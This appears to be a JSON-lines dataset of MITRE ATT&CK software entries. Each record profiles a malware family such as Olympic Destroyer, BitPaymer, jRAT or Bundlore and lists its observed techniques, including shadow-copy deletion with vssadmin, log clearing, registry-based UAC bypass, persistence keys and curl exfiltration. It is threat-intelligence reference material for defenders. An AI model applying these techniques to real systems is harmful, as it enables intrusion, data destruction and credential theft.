DLL in order to evade detection."], "is_subtechnique": false}
{"text": " [Epic](https://attack.mitre.org/software/S0091) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)", "idx": "https://attack.mitre.org/software/S0091", "title": "Epic", "entity": "Epic", "entity_type": "software", "entity_context": ["Epic has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.", "Epic compresses the collected data with bzip2 before sending it to the C2 server.", "Epic uses the <code>tasklist /v</code> command to obtain a list of processes.", "Epic gathers information on local group names.", "Epic uses the <code>net view</code> command on the victim’s machine.", "Epic heavily obfuscates its code to make analysis more difficult.", "Epic uses HTTP and HTTPS for C2 communications.", "Epic collects the OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings.", "Epic uses the <code>net time</code> command  to get the system time from the machine and collect the current date and time zone information.", "Epic uses the <code>net use</code>, <code>net session</code>, and <code>netstat</code> commands to gather information on network connections.", "Epic recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\\Temp directories.", "Epic uses the <code>tasklist /svc</code> command to list the services on the system.", "Epic searches for anti-malware services running on the victim’s machine and terminates itself if it finds them.", "Epic collects the user name from the victim’s machine.", "Turla has used valid digital certificates from Sysprint AG to sign its Epic dropper.", "Epic encrypts collected data using a public key framework before sending it over the C2 channel. Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server.", "Epic uses the <code>rem reg query</code> command to obtain values from Registry keys.", "Epic has a command to delete a file from the machine.", "Epic uses the <code>nbtstat -n</code> and <code>nbtstat -s</code> commands on the victim’s machine.", "Epic gathers a list of all user accounts, privilege classes, and time of last logon.", "Epic encrypts commands from the C2 server using a hardcoded key."], "is_subtechnique": false}
{"text": " [Olympic Destroyer](https://attack.mitre.org/software/S0365) is malware that was used by [Sandworm Team](https://attack.mitre.org/groups/G0034) against the 2018 Winter Olympics, held in Pyeongchang, South Korea. The main purpose of the malware was to render infected computer systems inoperable. The malware leverages various native Windows utilities and API calls to carry out its destructive tasks. [Olympic Destroyer](https://attack.mitre.org/software/S0365) has worm-like features to spread itself across a computer network in order to maximize its destructive impact.(Citation: Talos Olympic Destroyer 2018)(Citation: US District Court Indictment GRU Unit 74455 October 2020)", "idx": "https://attack.mitre.org/software/S0365", "title": "Olympic Destroyer", "entity": "Olympic Destroyer", "entity_type": "software", "entity_context": ["Olympic Destroyer contains a module that tries to obtain stored credentials from web browsers.", "Olympic Destroyer overwrites files locally and on remote shares. ", "Olympic Destroyer uses WMI to help propagate itself across a network.", "Olympic Destroyer uses Windows Management Instrumentation to enumerate all systems in the network.", "Olympic Destroyer will shut down the compromised system after it is done modifying system configuration settings.", "Olympic Destroyer will attempt to clear the System and Security event logs using <code>wevtutil</code>.", "Olympic Destroyer uses PsExec to interact with the <code>ADMIN$</code> network share to execute commands on remote systems.", "Olympic Destroyer uses the API call <code>ChangeServiceConfigW</code> to disable all services on the affected system.", "Olympic Destroyer attempts to copy itself to remote machines on the network.", "Olympic Destroyer will attempt to enumerate mapped network shares to later attempt to wipe all files on those shares.", "Olympic Destroyer contains a module that tries to obtain credentials from LSASS, similar to Mimikatz. These credentials are used with PsExec and Windows Management Instrumentation to help the malware propagate itself across a network.", "Olympic Destroyer uses the native Windows utilities <code>vssadmin</code>, <code>wbadmin</code>, and <code>bcdedit</code> to delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair.", "Olympic Destroyer utilizes PsExec to help propagate itself across a network.", "Olympic Destroyer uses API calls to enumerate the infected system's ARP table."], "is_subtechnique": false}
{"text": " [Pysa](https://attack.mitre.org/software/S0583) is a ransomware that was first used in October 2018 and has been seen to target particularly high-value finance, government and healthcare organizations.(Citation: CERT-FR PYSA April 2020)", "idx": "https://attack.mitre.org/software/S0583", "title": "Pysa", "entity": "Pysa", "entity_type": "software", "entity_context": ["Pysa can perform network reconnaissance using the Advanced IP Scanner tool.", "Pysa can perform OS credential dumping using Mimikatz.", "Pysa has deleted batch files after execution.  ", "Pysa can perform network reconnaissance using the Advanced Port Scanner tool.", "Pysa has the capability to stop antivirus services and disable Windows Defender. ", "Pysa can stop services and processes. ", "Pysa has used brute force attempts against a central management console, as well as some Active Directory accounts.", "Pysa has laterally moved using RDP connections. ", "Pysa has executed a malicious executable by naming it svchost.exe.", "Pysa has extracted credentials from the password database before encrypting the files. ", "Pysa has modified the registry key “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System” and added the ransom note. ", "Pysa has used PsExec to copy and execute the ransomware.", "Pysa has used Python scripts to deploy ransomware.", "Pysa has the functionality to delete shadow copies. ", "Pysa has used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions. ", "Pysa has used Powershell scripts to deploy its ransomware. "], "is_subtechnique": false}
{"text": " [SamSam](https://attack.mitre.org/software/S0370) is ransomware that appeared in early 2016. Unlike some ransomware, its variants have required operators to manually interact with the malware to execute some of its core components.(Citation: US-CERT SamSam 2018)(Citation: Talos SamSam Jan 2018)(Citation: Sophos SamSam Apr 2018)(Citation: Symantec SamSam Oct 2018)", "idx": "https://attack.mitre.org/software/S0370", "title": "SamSam", "entity": "SamSam", "entity_type": "software", "entity_context": ["SamSam encrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files.", "SamSam uses custom batch scripts to execute some of its components.", "SamSam has been seen using AES or DES to encrypt payloads and payload components.", "SamSam has been seen deleting its own files and payloads to make analysis of the attack more difficult.", "SamSam has used garbage code to pad some of its malware components."], "is_subtechnique": false}
{"text": " [BitPaymer](https://attack.mitre.org/software/S0570) is a ransomware variant first observed in August 2017 targeting hospitals in the U.K. [BitPaymer](https://attack.mitre.org/software/S0570) uses a unique encryption key, ransom note, and contact information for each operation. [BitPaymer](https://attack.mitre.org/software/S0570) has several indicators suggesting overlap with the [Dridex](https://attack.mitre.org/software/S0384) malware and is often delivered via [Dridex](https://attack.mitre.org/software/S0384).(Citation: Crowdstrike Indrik November 2018)", "idx": "https://attack.mitre.org/software/S0570", "title": "BitPaymer", "entity": "BitPaymer", "entity_type": "software", "entity_context": ["BitPaymer can set values in the Registry to help in execution. ", "BitPaymer has used dynamic API resolution to avoid identifiable strings within the binary, including <code>RegEnumKeyW</code>.", "BitPaymer can use the tokens of users to create processes on infected systems.", "BitPaymer has copied itself to the <code>:bin</code> alternate data stream of a newly created file.", "BitPaymer can search for network shares on the domain or workgroup using <code>net view <host></code>.", "BitPaymer has attempted to install itself as a service to maintain persistence.", "BitPaymer can use <code>icacls /reset</code> and <code>takeown /F</code> to reset a targeted executable's permissions and then take ownership.", "BitPaymer can suppress UAC prompts by setting the <code>HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command</code> registry key on Windows 10 or <code>HKCU\\Software\\Classes\\mscfile\\shell\\open\\command</code> on Windows 7 and launching the <code>eventvwr.msc</code> process, which launches BitPaymer with elevated privileges.", "BitPaymer has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.", "BitPaymer can enumerate the sessions for each user logged onto the infected host.", "BitPaymer attempts to remove the backup shadow files from the host using <code>vssadmin.exe Delete Shadows /All /Quiet</code>.", "BitPaymer compares file names and paths to a list of excluded names and directory names during encryption.", "BitPaymer has set the run key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.", "BitPaymer can use <code>net view</code> to discover remote systems.", "BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.", "BitPaymer can use the RegEnumKeyW to iterate through Registry keys. ", "BitPaymer can enumerate existing Windows services on the host that are configured to run as LocalSystem.", "BitPaymer can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending <code>.locked</code> to the filename."], "is_subtechnique": false}
{"text": " [Chaos](https://attack.mitre.org/software/S0220) is Linux malware that compromises systems by brute force attacks against SSH services. Once installed, it provides a reverse shell to its controllers, triggered by unsolicited packets. (Citation: Chaos Stolen Backdoor)", "idx": "https://attack.mitre.org/software/S0220", "title": "Chaos", "entity": "Chaos", "entity_type": "software", "entity_context": ["Chaos conducts brute force attacks against SSH services to gain initial access.", "After initial compromise, Chaos will download a second stage to establish a more permanent presence on the affected system.", "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.", "Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES."], "is_subtechnique": false}
{"text": " [jRAT](https://attack.mitre.org/software/S0283) is a cross-platform, Java-based backdoor originally available for purchase in 2012. Variants of [jRAT](https://attack.mitre.org/software/S0283) have been distributed via a software-as-a-service platform, similar to an online subscription model.(Citation: Kaspersky Adwind Feb 2016) (Citation: jRAT Symantec Aug 2018)", "idx": "https://attack.mitre.org/software/S0283", "title": "jRAT", "entity": "jRAT", "entity_type": "software", "entity_context": ["jRAT has been distributed as HTA files with VBScript.\t", "jRAT has been distributed as HTA files with JScript.\t", "jRAT can steal keys for VPNs and cryptocurrency wallets.", "jRAT can list local services.", "jRAT can capture passwords from common chat applications such as MSN Messenger, AOL, Instant Messenger, and and Google Talk.", "jRAT has the capability to log keystrokes from the victim’s machine, both offline and online.", "jRAT uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.", "jRAT has a function to delete files from the victim’s machine.", "jRAT can query and kill system processes.", "jRAT can map UPnP ports.", "jRAT has command line access.", "jRAT can capture microphone recordings.", "jRAT has the capability to capture video from a webcam.", "jRAT can gather victim internal and external IPs.", "jRAT’s Java payload is encrypted with AES. Additionally, backdoor files are encrypted using DES as a stream cipher. Later variants of jRAT also incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool.", "jRAT can download and execute files.", "jRAT can capture passwords from common web browsers such as Internet Explorer, Google Chrome, and Firefox.", "jRAT can serve as a SOCKS proxy server.", "jRAT has the capability to take screenshots of the victim’s machine.", "jRAT can capture clipboard data.", "jRAT can support RDP control.", "jRAT can browse file systems.", "jRAT can list network connections.", "jRAT payloads have been packed.", "jRAT collects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor.", "jRAT can list and manage startup entries.", "jRAT can list security software, such as by using WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.", "jRAT can be configured to reconnect at certain intervals."], "is_subtechnique": false}
{"text": " [RDFSNIFFER](https://attack.mitre.org/software/S0416) is a module loaded by [BOOSTWRITE](https://attack.mitre.org/software/S0415) which allows an attacker to monitor and tamper with legitimate connections made via an application designed to provide visibility and system management capabilities to remote IT techs.(Citation: FireEye FIN7 Oct 2019)", "idx": "https://attack.mitre.org/software/S0416", "title": "RDFSNIFFER", "entity": "RDFSNIFFER", "entity_type": "software", "entity_context": ["RDFSNIFFER has the capability of deleting local files.", "RDFSNIFFER hooks several Win32 API functions to hijack elements of the remote system management user-interface.", "RDFSNIFFER has used several Win32 API functions to interact with the victim machine."], "is_subtechnique": false}
{"text": " [Socksbot](https://attack.mitre.org/software/S0273) is a backdoor that abuses Socket Secure (SOCKS) proxies. (Citation: TrendMicro Patchwork Dec 2017)", "idx": "https://attack.mitre.org/software/S0273", "title": "Socksbot", "entity": "Socksbot", "entity_type": "software", "entity_context": ["Socksbot can take screenshots.", "Socksbot can list all running processes.", "Socksbot can start SOCKS proxy threads.", "Socksbot creates a suspended svchost process and injects its DLL into it.", "Socksbot can write and execute PowerShell scripts."], "is_subtechnique": false}
{"text": " [BBSRAT](https://attack.mitre.org/software/S0127) is malware with remote access tool functionality that has been used in targeted compromises. (Citation: Palo Alto Networks BBSRAT)", "idx": "https://attack.mitre.org/software/S0127", "title": "BBSRAT", "entity": "BBSRAT", "entity_type": "software", "entity_context": ["BBSRAT can query service configuration information.", "BBSRAT can modify service configurations.", "BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.", "BBSRAT can delete files and directories.", "BBSRAT has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList <code>{42aedc87-2188-41fd-b9a3-0c966feabec1}</code> or Microsoft WBEM New Event Subsystem <code>{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}</code> depending on the system's CPU architecture.", "BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution.", "BBSRAT can list file and directory information.", "BBSRAT uses Expand to decompress a CAB file into executable content.", "BBSRAT uses HTTP TCP port 80 and HTTPS TCP port 443 for communications.", "BBSRAT can list running processes.", "BBSRAT has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe</code>.", "BBSRAT uses a custom encryption algorithm on data sent back to the C2 server over HTTP.", "BBSRAT can start, stop, or delete services.", "DLL side-loading has been used to execute BBSRAT through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with BBSRAT by the dropper.", "BBSRAT can compress data with ZLIB prior to sending it back to the C2 server."], "is_subtechnique": false}
{"text": " [GravityRAT](https://attack.mitre.org/software/S0237) is a remote access tool (RAT) and has been in ongoing development since 2016. The actor behind the tool remains unknown, but two usernames have been recovered that link to the author, which are \"TheMartian\" and \"The Invincible.\" According to the National Computer Emergency Response Team (CERT) of India, the malware has been identified in attacks against organization and entities in India. (Citation: Talos GravityRAT)", "idx": "https://attack.mitre.org/software/S0237", "title": "GravityRAT", "entity": "GravityRAT", "entity_type": "software", "entity_context": ["GravityRAT has a feature to list the available services on the system.", "GravityRAT collects the victim username along with other account information (account type, description, full name, SID and status).", "GravityRAT collects the MAC address, computer name, and CPU information.", "GravityRAT collects the victim IP address, MAC address, as well as the victim account domain name.", "GravityRAT has been delivered via Word documents using DDE for execution.", "GravityRAT executes commands remotely on the infected host.", "GravityRAT can obtain the date and time of a system.", "GravityRAT steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.", "GravityRAT uses HTTP for C2.", "GravityRAT uses the <code>netstat</code> command to find open ports on the victim’s machine.", "GravityRAT collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.", "GravityRAT uses WMI to check the BIOS and manufacturer information for strings like \"VMWare\", \"Virtual\", and \"XEN\" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment. ", "GravityRAT supports file encryption (AES with the key \"lolomycin2017\").", "GravityRAT lists the running processes on the system.", "The author of GravityRAT submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.", "GravityRAT steals files based on an extension list if a USB drive is connected to the system.", "GravityRAT creates a scheduled task to ensure it is re-executed everyday.", "GravityRAT has used HTTP over a non-standard port, such as TCP port 46769.", "GravityRAT collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed)."], "is_subtechnique": false}
{"text": " [Get2](https://attack.mitre.org/software/S0460) is a downloader written in C++ that has been used by [TA505](https://attack.mitre.org/groups/G0092) to deliver [FlawedGrace](https://attack.mitre.org/software/S0383), [FlawedAmmyy](https://attack.mitre.org/software/S0381), Snatch and [SDBbot](https://attack.mitre.org/software/S0461).(Citation: Proofpoint TA505 October 2019)", "idx": "https://attack.mitre.org/software/S0460", "title": "Get2", "entity": "Get2", "entity_type": "software", "entity_context": ["Get2 has the ability to identify running processes on an infected host.", "Get2 has the ability to use HTTP to send information collected from an infected host to C2.", "Get2 has the ability to inject DLLs into processes.", "Get2 has the ability to run executables with command-line arguments.", "Get2 has the ability to identify the computer name and Windows version of an infected host.", "Get2 has the ability to identify the current username of an infected host."], "is_subtechnique": false}
{"text": " [OnionDuke](https://attack.mitre.org/software/S0052) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2013 to 2015. (Citation: F-Secure The Dukes)", "idx": "https://attack.mitre.org/software/S0052", "title": "OnionDuke", "entity": "OnionDuke", "entity_type": "software", "entity_context": ["OnionDuke can use a custom decryption algorithm to decrypt strings.", "OnionDuke uses Twitter as a backup C2.", "OnionDuke uses HTTP and HTTPS for C2.", "OnionDuke steals credentials from its victims.", "OnionDuke has the capability to use a Denial of Service module."], "is_subtechnique": false}
{"text": " [pngdowner](https://attack.mitre.org/software/S0067) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool with limited functionality and no persistence mechanism, suggesting it is used only as a simple \"download-and- execute\" utility. (Citation: CrowdStrike Putter Panda)", "idx": "https://attack.mitre.org/software/S0067", "title": "pngdowner", "entity": "pngdowner", "entity_type": "software", "entity_context": ["pngdowner uses HTTP for command and control.", "If an initial connectivity check fails, pngdowner attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.", "pngdowner deletes content from C2 communications that was saved to the user's temporary directory."], "is_subtechnique": false}
{"text": " [HAPPYWORK](https://attack.mitre.org/software/S0214) is a downloader used by [APT37](https://attack.mitre.org/groups/G0067) to target South Korean government and financial victims in November 2016. (Citation: FireEye APT37 Feb 2018)", "idx": "https://attack.mitre.org/software/S0214", "title": "HAPPYWORK", "entity": "HAPPYWORK", "entity_type": "software", "entity_context": ["can download and execute a second-stage payload.", "can collect the victim user name.", "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path."], "is_subtechnique": false}
{"text": " [ROKRAT](https://attack.mitre.org/software/S0240) is a cloud-based remote access tool (RAT) used by [APT37](https://attack.mitre.org/groups/G0067). This software has been used to target victims in South Korea. [APT37](https://attack.mitre.org/groups/G0067) used ROKRAT during several campaigns in 2016 through 2018. (Citation: Talos ROKRAT) (Citation: Talos Group123)", "idx": "https://attack.mitre.org/software/S0240", "title": "ROKRAT", "entity": "ROKRAT", "entity_type": "software", "entity_context": ["ROKRAT has the ability to gather a list of files and directories on the infected system.", "ROKRAT accesses the <code>HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData</code> Registry key to obtain the System manufacturer value to identify the machine type.", "ROKRAT can request to delete files.\t", "ROKRAT checks for sandboxing libraries.", "ROKRAT sends collected files back over same C2 channel.", "ROKRAT steals credentials stored in Web browsers by querying the sqlite database.", "ROKRAT use HTTPS for all command and control communication methods.", "ROKRAT leverages legitimate social networking sites and cloud platforms (Twitter, Yandex, and Mediafire) for C2 communications.", "ROKRAT has a audio capture and eavesdropping module.", "ROKRAT steals credentials by leveraging the Windows Vault mechanism.", "ROKRAT checks for debugging tools.", "ROKRAT gathers the computer name and checks the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.", "ROKRAT can request to upload collected host data and additional files.", "ROKRAT retrieves additional malicious payloads from the C2 server.", "ROKRAT uses a keylogger to capture keystrokes and location of where the user is typing.", "ROKRAT captures screenshots of the infected system using the gdi32 library.", "ROKRAT lists the current running processes on the system."], "is_subtechnique": false}
{"text": " [Kivars](https://attack.mitre.org/software/S0437) is a modular remote access tool (RAT), derived from the Bifrost RAT, that was used by [BlackTech](https://attack.mitre.org/groups/G0098) in a 2010 campaign.(Citation: TrendMicro BlackTech June 2017)", "idx": "https://attack.mitre.org/software/S0437", "title": "Kivars", "entity": "Kivars", "entity_type": "software", "entity_context": ["Kivars has the ability to conceal its activity through hiding active windows.", "Kivars has the ability to uninstall malware from the infected host.", "Kivars has the ability to download and execute files.", "Kivars has the ability to capture screenshots on the infected host.", "Kivars has the ability to list drives on the infected host.", "Kivars has the ability to initiate keylogging on the infected host.", "Kivars has the ability to remotely trigger keyboard input and mouse clicks. "], "is_subtechnique": false}
{"text": " [RegDuke](https://attack.mitre.org/software/S0511) is a first stage implant written in .NET and used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2017. [RegDuke](https://attack.mitre.org/software/S0511) has been used to control a compromised machine when control of other implants on the machine was lost.(Citation: ESET Dukes October 2019)", "idx": "https://attack.mitre.org/software/S0511", "title": "RegDuke", "entity": "RegDuke", "entity_type": "software", "entity_context": ["RegDuke can persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started.", "RegDuke can store its encryption key in the Registry.", "RegDuke can download files from C2.", "RegDuke can decrypt strings with a key either stored in the Registry or hardcoded in the code.", "RegDuke can use control-flow flattening or the commercially available .NET Reactor for obfuscation.", "RegDuke can hide data in images, including use of the Least Significant Bit (LSB).", "RegDuke can extract and execute PowerShell scripts from C2 communications.", "RegDuke can use Dropbox as its C2 server."], "is_subtechnique": false}
{"text": " [PipeMon](https://attack.mitre.org/software/S0501) is a multi-stage modular backdoor used by [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: ESET PipeMon May 2020)", "idx": "https://attack.mitre.org/software/S0501", "title": "PipeMon", "entity": "PipeMon", "entity_type": "software", "entity_context": ["PipeMon can iterate over the running processes to find a suitable injection target.", "PipeMon can decrypt password-protected executables.", "PipeMon's first stage has been executed by a call to <code>CreateProcess</code> with the decryption password in an argument. PipeMon has used a call to <code>LoadLibrary</code> to load its installer.", "PipeMon installer can use UAC bypass techniques to install the payload.", "PipeMon can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts.", "PipeMon can install additional modules via C2 commands.", "PipeMon can collect and send OS version and computer name as a part of its C2 beacon.", "PipeMon can collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon.", "PipeMon modules are stored encrypted on disk.", "PipeMon can inject its modules into various processes using reflective DLL loading.", "The PipeMon communication module can use a custom protocol based on TLS over TCP.", "PipeMon can attempt to gain administrative privileges using token impersonation.", "PipeMon communications are RC4 encrypted.", "PipeMon has used call to <code>LoadLibrary</code> to load its installer. PipeMon loads its modules using reflective loading or custom shellcode.", "The PipeMon installer has modified the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors</code> to install PipeMon as a Print Processor.", "PipeMon, its installer, and tools are signed with stolen code-signing certificates.", "PipeMon can check for the presence of ESET and Kaspersky security software.", "PipeMon can use parent PID spoofing to elevate privileges.", "PipeMon has stored its encrypted payload in the Registry.", "PipeMon can send time zone information from a compromised host to C2.", "PipeMon can switch to an alternate C2 domain when a particular date has been reached.", "PipeMon modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor."], "is_subtechnique": false}
{"text": " [Bundlore](https://attack.mitre.org/software/S0482) is adware written for macOS that has been in use since at least 2015. Though categorized as adware, [Bundlore](https://attack.mitre.org/software/S0482) has many features associated with more traditional backdoors.(Citation: MacKeeper Bundlore Apr 2019)", "idx": "https://attack.mitre.org/software/S0482", "title": "Bundlore", "entity": "Bundlore", "entity_type": "software", "entity_context": ["Bundlore prompts the user for their credentials.", "Bundlore can change browser security settings to enable extensions to be installed. Bundlore uses the <code>pkill cfprefsd</code> command to prevent users from inspecting processes.", "Bundlore creates a new key pair with <code>ssh-keygen</code> and drops the newly created user key in <code>authorized_keys</code> to enable remote login.", "Bundlore has disguised a malicious .app file as a Flash Player update.", "Bundlore can execute JavaScript by injecting it into the victim's browser.", "Bundlore has obfuscated data with base64, AES, RC4, and bz2.", "Bundlore has the ability to enumerate what browser is being used as well as version information for Safari.", "Bundlore has leveraged /bin/sh and /bin/bash to execute commands on the victim machine.", "Bundlore has attempted to get users to execute a malicious .app file that looks like a Flash Player update.", "Bundlore has been spread through malicious advertisements on websites.", "Bundlore has used Python scripts to execute payloads.", "Bundlore will enumerate the macOS version to determine which follow-on behaviors to execute using <code>/usr/bin/sw_vers -productVersion</code>.", "Bundlore can download and execute new versions of itself.", "Bundlore can use AppleScript to inject malicious JavaScript into a browser.", "Bundlore uses HTTP requests for C2.", "Bundlore can install malicious browser extensions that are used to hijack user searches.", "Bundlore uses the <code>curl -s -L -o</code> command to exfiltrate archived data to a URL.(citation: 20 macOS Common Tools and Techniques)", "Bundlore uses the <code>mktemp</code> utility to make unique file and directory names for payloads, such as <code>TMP_DIR=`mktemp -d -t x</code>.", "Bundlore has used the <code>ps</code> command to list processes.", "Bundlore changes the permissions of a payload using the command <code>chmod -R 755</code>.", "Bundlore can persist via a LaunchDaemon.", "Bundlore has used <code>openssl</code> to decrypt AES encrypted payload data. Bundlore has also used base64 and RC4 with a hardcoded key to deobfuscate data.", "Bundlore can persist via a LaunchAgent."], "is_subtechnique": false}
{"text": " [SynAck](https://attack.mitre.org/software/S0242) is variant of Trojan ransomware targeting mainly English-speaking users since at least fall 2017. (Citation: SecureList SynAck Doppelgänging May 2018) (Citation: Kaspersky Lab SynAck May 2018)", "idx": "https://attack.mitre.org/software/S0242", "title": "SynAck", "entity": "SynAck", "entity_type": "software", "entity_context": ["SynAck checks its directory location in an attempt to avoid launching in a sandbox.", "SynAck encrypts the victims machine followed by asking the victim to pay a ransom. ", "SynAck gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.", "SynAck enumerates all running processes.", "SynAck lists all the keyboard layouts installed on the victim’s system using <code>GetKeyboardLayoutList</code> API and checks against a hardcoded language code list. If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files. ", "SynAck clears event logs.", "SynAck abuses NTFS transactions to launch and conceal malicious processes.", "SynAck enumerates all running services.", "SynAck enumerates Registry keys associated with event logs.", "SynAck can manipulate Registry keys.", "SynAck gathers user names from infected hosts.", "SynAck parses the export tables of system DLLs to locate and call various Windows API functions.", "SynAck payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering."], "is_subtechnique": false}
{"text": " [MURKYTOP](https://attack.mitre.org/software/S0233) is a reconnaissance tool used by [Leviathan](https://attack.mitre.org/groups/G0065). (Citation: FireEye Periscope March 2018)", "idx": "https://attack.mitre.org/software/S0233", "title": "MURKYTOP", "entity": "MURKYTOP", "entity_type": "software", "entity_context": ["MURKYTOP has the capability to delete local files.", "MURKYTOP has the capability to retrieve information about groups.", "MURKYTOP has the capability to identify remote hosts on connected networks.", "MURKYTOP has the capability to schedule remote AT jobs.", "MURKYTOP has the capability to retrieve information about users on remote hosts.", "MURKYTOP has the capability to scan for open ports on hosts in a connected network.", "MURKYTOP uses the command-line interface.", "MURKYTOP has the capability to retrieve information about shares on remote hosts.", "MURKYTOP has the capability to retrieve information about the OS."], "is_subtechnique": false}
{"text": " [Smoke Loader](https://attack.mitre.org/software/S0226) is a malicious bot application that can be used to load other malware. [Smoke Loader](https://attack.mitre.org/software/S0226) has been seen in the wild since at least 2011 and has included a number of different payloads. It is notorious for its use of deception and self-protection. It also comes with several plug-ins. (Citation: Malwarebytes SmokeLoader 2016) (Citation: Microsoft Dofoil 2018)", "idx": "https://attack.mitre.org/software/S0226", "title": "Smoke Loader", "entity": "Smoke Loader", "entity_type": "software", "entity_context": ["Smoke Loader adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.", "Smoke Loader recursively searches through directories for files.", "Smoke Loader launches a scheduled task.", "Smoke Loader searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).", "Smoke Loader spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.", "Smoke Loader downloads a new version of itself once it has installed. It also downloads additional plugins.", "Smoke Loader scans processes to perform anti-VM checks. ", "Smoke Loader searches for credentials stored from web browsers.", "Smoke Loader uses HTTP for C2.", "Smoke Loader deobfuscates its code.", "Smoke Loader searches for files named logins.json to parse for credentials.", "Smoke Loader uses a simple one-byte XOR method to obfuscate values in the malware.", "Smoke Loader injects into the Internet Explorer process.", "Smoke Loader adds a Visual Basic script in the Startup folder to deploy the payload."], "is_subtechnique": false}
{"text": " [CosmicDuke](https://attack.mitre.org/software/S0050) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. (Citation: F-Secure The Dukes)", "idx": "https://attack.mitre.org/software/S0050", "title": "CosmicDuke", "entity": "CosmicDuke", "entity_type": "software", "entity_context": ["CosmicDuke takes periodic screenshots and exfiltrates them.", "CosmicDuke searches attached and mounted drives for file extensions and keywords that match a predefined list.", "CosmicDuke exfiltrates collected files automatically over FTP to remote servers.", "CosmicDuke exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.", "CosmicDuke copies and exfiltrates the clipboard contents every 30 seconds.", "CosmicDuke steals user files from removable media with file extensions and keywords that match a predefined list.", "CosmicDuke uses Windows services typically named \"javamtsup\" for persistence.", "CosmicDuke attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.", "CosmicDuke steals user files from local hard drives with file extensions that match a predefined list.", "CosmicDuke collects user credentials, including passwords, for various programs including Web browsers.", "CosmicDuke uses scheduled tasks typically named \"Watchmon Service\" for persistence.", "CosmicDuke collects Windows account hashes.", "CosmicDuke collects user credentials, including passwords, for various programs including popular instant messaging applications and email clients as well as WLAN keys.", "CosmicDuke can use HTTP or HTTPS for command and control to hard-coded C2 servers.", "CosmicDuke contains a custom version of the RC4 algorithm that includes a programming error.", "CosmicDuke collects LSA secrets.", "CosmicDuke searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.", "CosmicDuke uses a keylogger.", "CosmicDuke steals user files from network shared drives with file extensions and keywords that match a predefined list."], "is_subtechnique": false}
{"text": " [FakeM](https://attack.mitre.org/software/S0076) is a shellcode-based Windows backdoor that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)", "idx": "https://attack.mitre.org/software/S0076", "title": "FakeM", "entity": "FakeM", "entity_type": "software", "entity_context": ["FakeM C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Additionally, some variants of FakeM use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.", "FakeM contains a keylogger module.", "Some variants of FakeM use SSL to communicate with C2 servers.", "The original variant of FakeM encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation. Some variants of FakeM use RC4 to encrypt C2 traffic."], "is_subtechnique": false}
